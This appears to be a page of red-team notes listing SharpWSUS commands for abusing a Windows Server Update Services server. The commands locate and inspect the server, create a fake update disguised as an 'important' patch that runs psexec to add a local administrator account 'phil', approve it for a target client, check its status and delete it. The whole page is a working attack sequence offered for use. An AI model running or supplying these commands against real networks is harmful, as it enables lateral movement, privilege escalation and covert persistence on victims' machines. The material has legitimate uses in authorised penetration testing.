# Page 3

https://github.com/nettitude/SharpWSUS

```
sharpwsus locate

sharpwsus inspect

sharpwsus create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \\"net user phil Password123! /add && net localgroup administrators phil /add\\"" /title:"Great UpdateC21" /date:2021-10-03 /kb:500123 /rating:Important /description:"Really important update" /url:"https://google.com"

sharpwsus approve /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:win10-client10.blorebank.local /groupname:"Awesome Group C2"

sharpwsus check /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:win10-client10.blorebank.local

sharpwsus delete /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:win10-client10.blorebank.local /groupname:"Awesome Group C2"
```
